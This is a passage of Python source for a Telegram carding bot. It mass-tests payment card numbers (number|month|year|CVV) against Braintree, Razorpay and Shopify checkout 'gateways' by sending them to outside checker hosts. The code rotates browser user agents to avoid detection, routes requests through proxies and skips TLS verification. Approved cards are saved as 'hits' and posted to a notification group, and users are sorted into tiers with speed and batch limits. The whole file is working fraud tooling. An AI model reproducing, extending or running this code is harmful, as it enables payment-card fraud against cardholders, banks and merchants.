        f"or <code>/rzmc &lt;cards&gt;</code> for mass checks.",
        parse_mode=ParseMode.HTML
    )


async def rz_amount_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set Razorpay amount in INR - /rz_amount <amount>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        current = context.user_data.get('razorpay_amount', 10)
        await update.message.reply_text(
            f"💰 <b>Razorpay Amount Settings</b>\n\n"
            f"Current amount: <b>₹{current}</b>\n\n"
            f"Usage: <code>/rz_amount &lt;amount&gt;</code>\n"
            f"Example: <code>/rz_amount 100</code>\n\n"
            f"<i>Minimum: ₹1, Maximum: ₹100000</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        amount = int(context.args[0])
        if amount < 1 or amount > 100000:
            await update.message.reply_text("❌ Amount must be between ₹1 and ₹100000")
            return
        
        context.user_data['razorpay_amount'] = amount
        
        await update.message.reply_text(
            f"✅ <b>Razorpay amount set to: ₹{amount}</b>\n\n"
            f"All Razorpay checks will attempt to charge ₹{amount} per card.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid amount. Please enter a number like 100")
        
        
        
async def admin_direct_add_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to directly add sites to Autoshopify pool without checking - /sadd <site1> <site2> ... or reply to .txt file"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    
    # Check if replying to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await handle_sadd_file(update, context)
        return
    
    if not context.args:
        await update.message.reply_text(
            "➕ <b>Direct Site Add (Admin)</b>\n\n"
            "<b>Methods:</b>\n\n"
            "1️⃣ <b>Reply to a .txt file:</b>\n"
            "   Send a .txt file with sites (one per line) and reply with <code>/sadd</code>\n\n"
            "2️⃣ <b>Direct text input:</b>\n"
            "   <code>/sadd &lt;site1&gt; &lt;site2&gt; ...</code>\n\n"
            "<b>Examples:</b>\n"
            "<code>/sadd example.com</code>\n"
            "<code>/sadd site1.com site2.com site3.com</code>\n"
            "<code>/sadd https://example.myshopify.com https://store.com</code>\n\n"
            "<b>Features:</b>\n"
            "• Adds sites DIRECTLY to Autoshopify pool\n"
            "• NO price checking\n"
            "• NO accessibility testing\n"
            "• NO pending approval\n"
            "• Instant addition to rotation\n"
            "• Supports .txt files with one site per line\n\n"
            "⚠️ <i>Use with caution - sites are added as-is without validation</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Process direct text input
    await process_sadd_sites(update, context, context.args)

async def handle_sadd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file for /sadd command"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    
    try:
        # Get the file
        file = await update.message.reply_to_message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        # Parse sites from file (one per line)
        sites = []
        for line in content.splitlines():
            line = line.strip()
            # Skip empty lines and comments
            if line and not line.startswith('#'):
                # Remove any trailing commas or extra spaces
                line = line.rstrip(',').strip()
                if line:
                    sites.append(line)
        
        if not sites:
            await update.message.reply_text("❌ No sites found in the file.")
            return
        
        # Process the sites
        await process_sadd_sites(update, context, sites, filename=update.message.reply_to_message.document.file_name)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}")

async def process_sadd_sites(update: Update, context: ContextTypes.DEFAULT_TYPE, sites_input, filename=None):
    """Process and add sites to Autoshopify pool"""
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Convert input to list if it's not already
    if isinstance(sites_input, (list, tuple)):
        sites_list = list(sites_input)
    else:
        sites_list = list(sites_input)
    
    status_msg = await message.reply_text(
        f"📥 <b>Processing sites...</b>\n\n"
        f"Found {len(sites_list)} site(s) to add.\n"
        f"Adding to Autoshopify pool...",
        parse_mode=ParseMode.HTML
    )
    
    added = []
    failed = []
    already_exist = []
    invalid_format = []
    
    for i, site in enumerate(sites_list, 1):
        site = site.strip()
        if not site:
            continue
        
        # Update progress every 10 sites
        if i % 10 == 0:
            await status_msg.edit_text(
                f"📥 <b>Processing sites...</b>\n\n"
                f"Progress: {i}/{len(sites_list)}\n"
                f"✅ Added: {len(added)}\n"
                f"⚠️ Already exist: {len(already_exist)}\n"
                f"❌ Failed: {len(failed)}",
                parse_mode=ParseMode.HTML
            )
        
        # Normalize the site URL
        try:
            normalized_site = autosopi_site_manager.normalize_site_url(site)
            
            # Basic validation - check if it looks like a domain
            if not normalized_site or '.' not in normalized_site:
                invalid_format.append(site)
                continue
            
            # Check if already in rotation
            if normalized_site in autosopi_site_manager.sites:
                already_exist.append(normalized_site)
                continue
            
            # Directly add to sites list
            autosopi_site_manager.sites.append(normalized_site)
            
            # Initialize stats for this site
            autosopi_site_manager.site_stats[normalized_site] = {
                'successes': 0,
                'failures': 0,
                'total': 0,
                'added_by': user_id,
                'added_at': time.time(),
                'added_by_name': "Admin (direct add)",
                'added_via': 'sadd_command',
                'source_file': filename if filename else 'direct_input'
            }
            
            # Initialize failures (0)
            autosopi_site_manager.site_failures[normalized_site] = 0
            
            added.append(normalized_site)
            print(f"✅ Admin directly added site: {normalized_site}")
            
        except Exception as e:
            failed.append((site, str(e)))
    
    # Save the updated sites
    autosopi_site_manager.save_sites()
    
    # Prepare response message
    if filename:
        result_msg = f"📁 <b>File: {filename}</b>\n\n"
    else:
        result_msg = f"➕ <b>Direct Site Addition Complete</b>\n\n"
    
    result_msg += f"📊 <b>Summary:</b>\n"
    result_msg += f"   ✅ Added: {len(added)}\n"
    result_msg += f"   ⚠️ Already in rotation: {len(already_exist)}\n"
    result_msg += f"   ❌ Failed: {len(failed)}\n"
    result_msg += f"   🔧 Invalid format: {len(invalid_format)}\n"
    result_msg += f"━━━━━━━━━━━━━━━━━━━\n"
    
    if added:
        result_msg += f"\n✅ <b>Added ({len(added)} sites):</b>\n"
        for site in added[:15]:
            result_msg += f"  • <code>{site}</code>\n"
        if len(added) > 15:
            result_msg += f"  ... and {len(added) - 15} more\n"
    
    if already_exist:
        result_msg += f"\n⚠️ <b>Already in rotation ({len(already_exist)} sites):</b>\n"
        for site in already_exist[:10]:
            result_msg += f"  • <code>{site}</code>\n"
        if len(already_exist) > 10:
            result_msg += f"  ... and {len(already_exist) - 10} more\n"
    
    if invalid_format:
        result_msg += f"\n🔧 <b>Invalid format ({len(invalid_format)} sites):</b>\n"
        for site in invalid_format[:5]:
            result_msg += f"  • <code>{site}</code>\n"
        if len(invalid_format) > 5:
            result_msg += f"  ... and {len(invalid_format) - 5} more\n"
        result_msg += f"\n💡 <i>Valid format: domain.com, https://domain.com, or domain.myshopify.com</i>\n"
    
    if failed:
        result_msg += f"\n❌ <b>Failed to add ({len(failed)} sites):</b>\n"
        for site, error in failed[:5]:
            result_msg += f"  • <code>{site}</code> - {error[:50]}\n"
        if len(failed) > 5:
            result_msg += f"  ... and {len(failed) - 5} more\n"
    
    result_msg += f"\n━━━━━━━━━━━━━━━━━━━\n"
    result_msg += f"📊 Total sites in rotation: {len(autosopi_site_manager.sites)}\n"
    result_msg += f"💡 Use <code>/aumc</code> to check cards with these sites\n"
    result_msg += f"📋 Use <code>/sites</code> to list all sites"
    
    await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
        
        
        


# ============ FIXED BRAINTREE GATEWAY (KEEPING ORIGINAL FUNCTION NAMES) ============

import zlib
import gzip
import brotli
import random
import time
import json
import urllib.parse
import asyncio
import traceback
from typing import Dict, Tuple, Optional
import httpx

BRAINTREE_API_URL = "https://b3charge-kuqg.onrender.com/check"
BRAINTREE_BASE_URL = "https://b3charge-kuqg.onrender.com"

# Rotating user agents to avoid detection
BRAINTREE_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

class BraintreeSession:
    """Maintain session with cookies and headers for Braintree API"""
    
    def __init__(self):
        self.client = None
        self.session_cookies = {}
        self.last_request_time = 0
        self.min_request_interval = 2.0  # Increased to 2 seconds
        self.request_count = 0
        self._lock = asyncio.Lock()
        self.current_proxy = None
        self.wakeup_done = False  # Track if wakeup was performed
        
    async def get_client(self, proxy: str = None):
        """Get or create HTTP client"""
        async with self._lock:
            if not self.client or proxy != self.current_proxy:
                if self.client:
                    await self.client.aclose()
                
                limits = httpx.Limits(
                    max_keepalive_connections=2,  # Reduced
                    max_connections=3,  # Reduced
                    keepalive_expiry=30
                )
                timeout = httpx.Timeout(30.0, connect=15.0, read=20.0)
                
                client_kwargs = {
                    'timeout': timeout,
                    'limits': limits,
                    'verify': False,
                    'http2': True,
                    'follow_redirects': True
                }
                
                # Only use proxy if it's working
                if proxy and not proxy.startswith('http://***'):
                    proxy_url = format_proxy(proxy)
                    if proxy_url:
                        client_kwargs['proxies'] = {
                            'http://': proxy_url,
                            'https://': proxy_url
                        }
                        print(f"🔌 Braintree using proxy: {mask_proxy(proxy)}")
                        self.current_proxy = proxy
                    else:
                        self.current_proxy = None
                else:
                    self.current_proxy = None
                    print("🔌 Braintree using direct connection")
                
                self.client = httpx.AsyncClient(**client_kwargs)
            
            return self.client
    
    def get_random_headers(self):
        """Generate random browser-like headers"""
        user_agent = random.choice(BRAINTREE_USER_AGENTS)
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        }
        
        return headers
    
    async def wait_for_rate_limit(self):
        """Ensure we don't request too quickly"""
        async with self._lock:
            now = time.time()
            time_since_last = now - self.last_request_time
            
            if time_since_last < self.min_request_interval:
                wait_time = self.min_request_interval - time_since_last
                await asyncio.sleep(wait_time)
            
            self.last_request_time = time.time()
            self.request_count += 1
    
    async def wake_up_once(self):
        """Wake up the service only once per session"""
        if self.wakeup_done:
            return True
        
        try:
            print("🌐 [Braintree] Initial wake-up sequence...")
            client = await self.get_client(None)  # Use direct connection for wake-up
            
            # Simple ping to wake up
            try:
                response = await client.get(
                    BRAINTREE_BASE_URL,
                    timeout=10
                )
                print(f"✅ [Braintree] Base endpoint: {response.status_code}")
            except:
                pass
            
            await asyncio.sleep(1)
            self.wakeup_done = True
            return True
            
        except Exception as e:
            print(f"⚠️ [Braintree] Wake-up error: {e}")
            return False
    
    async def close(self):
        """Close the HTTP client"""
        if self.client:
            await self.client.aclose()
            self.client = None

# Create global Braintree session
braintree_session = BraintreeSession()

def decompress_response(content: bytes, content_encoding: str) -> str:
    """Decompress response content"""
    if not content_encoding:
        try:
            return content.decode('utf-8')
        except UnicodeDecodeError:
            return content.decode('utf-8', errors='ignore')
    
    try:
        if 'gzip' in content_encoding:
            return gzip.decompress(content).decode('utf-8', errors='ignore')
        elif 'deflate' in content_encoding:
            return zlib.decompress(content).decode('utf-8', errors='ignore')
        else:
            return content.decode('utf-8', errors='ignore')
    except Exception as e:
        return content.decode('utf-8', errors='ignore')

def format_braintree_new_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Braintree response for display - KEEPING ORIGINAL FUNCTION NAME"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_msg = result.get("message", "Unknown")
    price = result.get("price", "$1.00")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Braintree\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    return ui, status_category

# ============ FIXED WAKE UP FUNCTION (KEEPING ORIGINAL NAME) ============
async def wake_up_braintree_advanced(proxy: str = None):
    """Fixed wake up - only does minimal ping"""
    try:
        print("🌐 [Braintree WakeUp] Quick wake-up...")
        client = await braintree_session.get_client(None)
        
        # Just ping the base URL
        await client.get(BRAINTREE_BASE_URL, timeout=10)
        return True
    except Exception as e:
        print(f"⚠️ [Braintree WakeUp] Error: {e}")
        return False
    
    
async def hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a test hit notification with Premium emojis - /hit"""
    
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    PREMIUM_EMOJI_IDS = {
        "skull": "5042167377869932162",
        "target": "5256131095094652290",
        "toy": "5249244862359812334",
        "diamond": "5427168083074628963",
        "flower": "6230927657257668107",
        "pink": "5041796412954641308",
        "doller": "5197434882321567830"
        
        
        }
    
    # Random price
    random_price = round(random.uniform(1.00, 9.99), 2)
    price_display = f"${random_price:.2f}"
    
    # Test message with Premium emojis
    test_message = (
        f'╔══════════════════╗\n'
        f'     ⩙ 𝑯𝒊𝒕 '
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
        f' 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅\n'
        f'╚══════════════════╝\n\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["pink"]}">💎</tg-emoji> <b>Gateway</b> ↬ Shopify Payments\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["flower"]}">🌸</tg-emoji> <b>Price</b> ↬ {price_display}\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["doller"]}">💵</tg-emoji> <b>Response</b> ↬ Order completed 💎\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["toy"]}">📍</tg-emoji> <b>User</b> ↬ @Cypher099\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> <b>Tier</b> ↬ ADMIN\n'
        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">☠️</tg-emoji> <b>Hit From</b> ↬ @Bladesarksbot'
    )
    
    try:
        await context.bot.send_message(
            chat_id=HIT_NOTIFICATION_GROUP_ID,
            text=test_message,
            parse_mode="HTML"
        )
        await update.message.reply_text("✅ Test hit notification sent with Premium emojis!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ============ FIXED CARD CHECK FUNCTION (KEEPING ORIGINAL NAME) ============
async def check_card_braintree_advanced(card: str, proxy: str = None) -> Dict:
    """
    Fixed Braintree card check - KEEPING ORIGINAL FUNCTION NAME
    - Removed wake-up for every card
    - Added proper error handling
    - Limited to 1 retry max
    """
    print(f"\n{'='*80}")
    print(f"💳 [BRAINTREE ADVANCED] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    else:
        print(f"🔌 Direct connection (no proxy)")
    print(f"{'='*80}")
    
    # Only 1 retry max
    max_attempts = 5
    
    for attempt in range(1, max_attempts + 1):
        try:
            # Rate limiting
            await braintree_session.wait_for_rate_limit()
            
            start_time = time.time()
            
            # Prepare request - ALWAYS include cc parameter
            encoded_card = urllib.parse.quote(card)
            cache_buster = random.randint(100000, 999999)
            
            # Build URL - ONLY add proxy if provided
            if proxy:
                proxy_param = proxy.replace('http://', '').replace('https://', '')
                api_url = f"{BRAINTREE_API_URL}?cc={encoded_card}&proxy={urllib.parse.quote(proxy_param)}&_={cache_buster}"
            else:
                api_url = f"{BRAINTREE_API_URL}?cc={encoded_card}&_={cache_buster}"
            
            # Get client (use direct connection for reliability)
            client = await braintree_session.get_client(None)  # Force direct connection
            headers = braintree_session.get_random_headers()
            
            print(f"📤 Request URL: {api_url[:100]}...")
            
            # Make request with appropriate timeout
            response = await client.get(api_url, headers=headers, timeout=25.0)
            elapsed = time.time() - start_time
            
            print(f"📥 Response time: {elapsed:.2f}s")
            print(f"📊 Status code: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    # Parse response
                    response_text = data.get("response", data.get("message", data.get("status", data.get("text", "Unknown"))))
                    result_text = data.get("result", data.get("Response", "Unknown"))
                    price = data.get("price", data.get("amount", "$1.00"))
                    status = data.get("status", "").upper()
                    
                    # Determine status category
                    if "DECLINED" in status or "declined" in response_text.lower():
                        status_display = "❌ DECLINED"
                        status_category = "declined"
                    elif "APPROVED" in status or "success" in response_text.lower():
                        status_display = "✅ APPROVED"
                        status_category = "approved"
                    elif "INSUFFICIENT" in status or "insufficient" in response_text.lower():
                        status_display = "💰 INSUFFICIENT FUNDS"
                        status_category = "approved"
                    else:
                        status_display = "⚠️ UNKNOWN"
                        status_category = "unknown"
                    
                    return {
                        "status": "success",
                        "result": result_text,
                        "message": response_text,
                        "status_display": status_display,
                        "status_category": status_category,
                        "elapsed": elapsed,
                        "price": price,
                        "attempts": attempt,
                        "proxy_used": proxy
                    }
                    
                except json.JSONDecodeError:
                    # Non-JSON response
                    return {
                        "status": "error",
                        "result": "PARSE_ERROR",
                        "message": "Invalid JSON response",
                        "status_display": "⚠️ PARSE ERROR",
                        "status_category": "error",
                        "elapsed": elapsed,
                        "attempts": attempt,
                        "proxy_used": proxy
                    }
            else:
                # API returned non-200
                error_msg = f"HTTP {response.status_code}"
                if attempt < max_attempts:
                    print(f"⚠️ {error_msg}, retrying...")
                    await asyncio.sleep(2)
                    continue
                else:
                    return {
                        "status": "error",
                        "result": f"HTTP_{response.status_code}",
                        "message": error_msg,
                        "status_display": f"⚠️ HTTP {response.status_code}",
                        "status_category": "error",
                        "elapsed": elapsed,
                        "attempts": attempt,
                        "proxy_used": proxy
                    }
                    
        except httpx.TimeoutException:
            print(f"⏰ Timeout on attempt {attempt}")
            if attempt < max_attempts:
                wait_time = attempt * 2
                print(f"🔄 Retrying after {wait_time}s...")
                await asyncio.sleep(wait_time)
                continue
            else:
                return {
                    "status": "error",
                    "result": "TIMEOUT",
                    "message": "Request timeout",
                    "status_display": "⚠️ TIMEOUT",
                    "status_category": "error",
                    "attempts": attempt,
                    "proxy_used": proxy
                }
        except Exception as e:
            print(f"❌ Error on attempt {attempt}: {e}")
            if attempt < max_attempts:
                await asyncio.sleep(1)
                continue
            else:
                return {
                    "status": "error",
                    "result": "ERROR",
                    "message": str(e)[:100],
                    "status_display": "⚠️ ERROR",
                    "status_category": "error",
                    "attempts": attempt,
                    "proxy_used": proxy
                }
    
    return {
        "status": "error",
        "result": "MAX_ATTEMPTS",
        "message": "Maximum retry attempts reached",
        "status_display": "⚠️ MAX RETRIES",
        "status_category": "error",
        "proxy_used": proxy
    }

# ============ FIXED SINGLE CHECK COMMAND (KEEPING ORIGINAL NAME) ============
async def single_check_braintree_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with fixed Braintree gateway - KEEPING ORIGINAL NAME"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /btn <card>\n"
            "Example: /btn 4011716751300740|02|2029|429"
        )
        return
    
    user_id = update.effective_user.id
    card_text = " ".join(context.args).strip()
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'braintree'):
        await update.message.reply_text("❌ Your tier doesn't have access to Braintree gateway.")
        return
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await update.message.reply_text("❌ Invalid card format. Use: card|mm|yy|cvv")
        return
    
    status_msg = await update.message.reply_text("🔄 Checking card with Braintree (optimized)...")
    
    try:
        # Get user tier for speed control
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        # Apply rate limiting
        await speed_controller.wait_if_needed()
        
        # Wake up once at the beginning (not per card)
        if not hasattr(context.bot_data, 'braintree_wakeup_done'):
            await wake_up_braintree_advanced(None)
            context.bot_data['braintree_wakeup_done'] = True
        
        start = time.time()
        result = await check_card_braintree_advanced(card, None)  # No proxy for reliability
        elapsed = time.time() - start
        
        speed_controller.record_response(elapsed)
        bin_info = await get_bin_info(card)
        ui, status_category = format_braintree_new_response(result, card, bin_info)
        
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved
        if status_category == "approved":
            await save_hit_to_file(
                card=card,
                gateway="Braintree",
                response=result.get("message", "Approved"),
                price=result.get("price", "$1.00"),
                bin_info=bin_info,
                user_id=user_id,
                user_tier=tier
            )
            
            # Send hit notification
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context,
                gateway="Braintree",
                card=card,
                response=result.get("message", "Approved"),
                price=result.get("price", "$1.00"),
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ Braintree error: {traceback.format_exc()}")

# ============ FIXED MASS CHECK LOGIC (KEEPING ORIGINAL NAME) ============
async def mass_check_braintree_advanced_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Fixed mass check logic with proper concurrency limits - KEEPING ORIGINAL NAME"""
    u_id = update.effective_user.id
    message = update.effective_message
    
    if u_id in braintree_active_tasks:
        await message.reply_text("⚠️  session. Please wait or use /stop")
        return
    
    try:
        braintree_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        results_sent = 0
        
        tier = user_manager.get_tier(u_id)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # IMPORTANT: Based on test results, limit concurrency to 1-2
        concurrency = min(2, TIER_CONCURRENCY.get(tier, 1))
        
        await message.reply_text(
            f"🔄 <b>Braintree Advanced Mass Check</b>\n\n"
            f"📝 Cards: {total}\n"
            f"📍 Using optimized Braintree gateway\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour\n"
            f"🔀 Concurrency: {concurrency} (limited for stability)\n"
            f"📊 Only approved cards will be shown",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        # Wake up once at the beginning
        await message.reply_text("🌐 Initializing Braintree connection...")
        await wake_up_braintree_advanced(None)
        await asyncio.sleep(2)
        
        semaphore = asyncio.Semaphore(concurrency)
        
        async def check_with_control(card, card_index):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                
                # No proxy for reliability
                result = await check_card_braintree_advanced(card, None)
                elapsed = time.time() - start
                
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed, card_index
        
        # Process in small chunks
        chunk_size = concurrency
        for i in range(0, len(cards), chunk_size):
            if u_id not in braintree_active_tasks:
                try:
                    await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                except:
                    pass
                break
            
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card, idx) for idx, card in enumerate(chunk, i+1)]
            
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=180
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            for item in chunk_results:
                if u_id not in braintree_active_tasks:
                    break
                
                if isinstance(item, Exception):
                    errors += 1
                    continue
                
                result, card, elapsed, idx = item
                    
                try:
                    bin_info = await get_bin_info(card)
                    ui, status_category = format_braintree_new_response(result, card, bin_info)
                except Exception as e:
                    errors += 1
                    continue
                
                if status_category == "approved":
                    approved += 1
                    
                    try:
                        await save_hit_to_file(
                            card=card,
                            gateway="Braintree",
                            response=result.get("message", "Approved"),
                            price=result.get("price", "$1.00"),
                            bin_info=bin_info,
                            user_id=u_id,
                            user_tier=tier
                        )
                        
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context,
                            gateway="Braintree",
                            card=card,
                            response=result.get("message", "Approved"),
                            price=result.get("price", "$1.00"),
                            user=user_data,
                            bin_info=bin_info,
                            status_category=status_category
                        )
                        
                        # Show result
                        stats = speed_controller.get_stats()
                        progress = int((idx/total)*10)
                        bar = "▓" * progress + "░" * (10 - progress)
                        
                        
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        results_sent += 1
                        
                    except Exception as e:
                        pass
                        
                elif status_category == "declined":
                    declined += 1
                else:
                    errors += 1
                
                user_manager.increment_checks(u_id, 1)
                await asyncio.sleep(0.2)
        
        if u_id in braintree_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = (
                f"🏁 <b>Braintree Advanced Session Finished</b>\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            )
            try:
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                pass
            
    except Exception as e:
        try:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            pass
    finally:
        braintree_active_tasks.pop(u_id, None)

# Keep the existing mass_check_braintree_advanced function that calls the logic
async def mass_check_braintree_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wrapper for mass check - KEEPING ORIGINAL NAME"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message

    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>Braintree Mass Check</b>\n\n"
            "Usage: /btnm <cards>\n"
            "Example: /btnm 4011716751300740|02|29|429 5067227347250688|10|29|700",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'braintree'):
        await update.message.reply_text("❌ Your tier doesn't have access to Braintree gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        await update.message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card format(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0][:30]}..."
        )
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Start mass check
    asyncio.create_task(mass_check_braintree_advanced_logic(update, context, cards))
    
    
# ============ B3CHARGED GATEWAY (BT3D API) - WITH PROXY FAILURE TRACKING ============
B3CHARGED_API_URL = "https://b3charged-production-f18e.up.railway.app/check"

def fix_b3_proxy_format(proxy: str) -> str:
    """Fix proxy format for B3 API - converts malformed to correct format"""
    if not proxy:
        return proxy
    
    # Remove http:// or https:// prefix
    proxy = proxy.replace('http://', '').replace('https://', '')
    
    # Check for malformed format: host:port@user:pass
    if '@' in proxy:
        parts = proxy.split('@')
        if len(parts) == 2:
            left = parts[0]
            right = parts[1]
            
            # Check if left looks like host:port (has dot and colon with numeric port)
            if '.' in left and ':' in left:
                left_parts = left.split(':')
                if len(left_parts) >= 2 and left_parts[-1].isdigit():
                    # Malformed: host:port@user:pass - swap them
                    return f"{right}@{left}"
    
    # Check for host:port:user:pass format
    if ':' in proxy and '@' not in proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            if port.isdigit():
                return f"{user}:{password}@{host}:{port}"
    
    return proxy

async def check_card_b3charged(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Check card using B3CHARGED API with proxy failure tracking and retry
    """
    print(f"\n{'='*80}")
    print(f"💳 [B3CHARGED GATEWAY] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Raw proxy: {proxy[:50]}...")
    else:
        print(f"🔌 No proxy")
    print(f"{'='*80}")
    
    # Default result
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
